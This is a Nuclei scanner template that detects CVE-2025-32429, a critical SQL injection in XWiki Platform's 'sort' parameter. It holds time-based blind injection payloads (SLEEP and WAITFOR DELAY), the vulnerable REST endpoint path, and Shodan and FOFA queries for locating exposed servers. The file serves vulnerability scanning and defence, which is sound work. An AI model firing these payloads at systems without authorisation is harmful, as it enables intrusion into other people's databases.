id: CVE-2025-32429

info:
  name: XWiki Platform - SQL Injection via getdeleteddocuments.vm (Simple)
  author: nuclei-community
  severity: critical
  description: |
    XWiki Platform versions 9.4-rc-1 to 16.10.5 and 17.0.0-rc-1 to 17.2.2 contain a SQL injection vulnerability
    in the getdeleteddocuments.vm template via the unsanitized 'sort' parameter.
  reference:
    - https://github.com/xwiki/xwiki-platform/security/advisories/GHSA-vr59-gm53-v7cq
    - https://jira.xwiki.org/browse/XWIKI-23093
  classification:
    cvss-score: 9.3
    cve-id: CVE-2025-32429
    cwe-id: CWE-89
  metadata:
    verified: true
    max-request: 1
    vendor: xwiki
    product: xwiki-platform
    shodan-query: http.html:"data-xwiki-reference"
    fofa-query: body="data-xwiki-reference"
  tags: cve,cve2025,xwiki,sqli,sql-injection

http:
  - raw:
      - |
        @timeout: 30s
        GET /{{path}}/rest/liveData/sources/liveTable/entries?sourceParams.template=getdeleteddocuments.vm&sort=id{{payload}} HTTP/1.1
        Host: {{Hostname}}

    attack: pitchfork
    payloads:
      path:
        - "xwiki"
        - "bin"
        - "xwiki/bin"

      payload:
        - ",(select%20*%20from%20(select(sleep(7)))a)"
        - "%2c(select%20*%20from%20(select(sleep(7)))a)"
        - ";WAITFOR%20DELAY%20'0:0:07'--"
        - "%20AND%20(SELECT%20*%20FROM%20(SELECT(SLEEP(7)))YjoC)%20AND%20'%'" 
        - "%20AND%20(SELECT%20*%20FROM%20(SELECT(SLEEP(7)))nQIP)"
        - "%20AND%20(SELECT%20*%20FROM%20(SELECT(SLEEP(7)))nQIP)--"

    stop-at-first-match: true
    matchers-condition: and
    matchers:
      - type: dsl
        dsl:
          - 'duration>=7'
        condition: and